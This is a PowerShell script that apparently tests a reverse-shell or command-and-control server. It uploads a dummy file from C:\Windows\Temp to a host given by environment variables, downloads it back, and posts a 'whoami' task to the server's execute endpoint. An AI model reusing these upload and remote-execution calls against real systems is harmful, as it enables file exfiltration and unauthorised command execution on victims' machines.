# Define variables
$session_id = $env:SESSION_ID
$uri = "http://${env:REVERSE_SHELL_HOST}:${env:REVERSE_SHELL_PORT}/files/$session_id/host.txt"
$filePath = "C:\Windows\Temp\host.txt"

echo example > C:\\Windows\\Temp\\example.txt
echo "${env:REVERSE_SHELL_HOST}:${env:REVERSE_SHELL_PORT}" > $filePath

# Obnoxious way to upload a file
$fileName = Split-Path $filePath -Leaf
$fileBytes = [System.IO.File]::ReadAllBytes($filePath);
$fileEnc = [System.Text.Encoding]::GetEncoding('UTF-8').GetString($fileBytes);
$boundary = [System.Guid]::NewGuid().ToString(); 
$LF = "`r`n";

$bodyLines = ( 
    "--$boundary",
    "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
    "Content-Type: application/octet-stream$LF",
    $fileEnc,
    "--$boundary--$LF" 
) -join $LF

Invoke-RestMethod "http://${env:REVERSE_SHELL_HOST}:${env:REVERSE_SHELL_PORT}/files/${env:SESSION_ID}/host.txt" -Method POST -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines

# Download the uploaded file
Invoke-WebRequest "http://${env:REVERSE_SHELL_HOST}:${env:REVERSE_SHELL_PORT}/files/${env:SESSION_ID}/host.txt" -Method GET -OutFile C:\\Windows\\Temp\\download.txt

# Execute a task on the server
$body = @{
    session_id = "${env:SESSION_ID}"
    task       = "whoami"
} | ConvertTo-Json

Invoke-WebRequest "http://${env:REVERSE_SHELL_HOST}:${env:REVERSE_SHELL_PORT}/execute" -Method POST -Body $body -ContentType "application/json" -OutFile C:\\Windows\\Temp\\execute.txt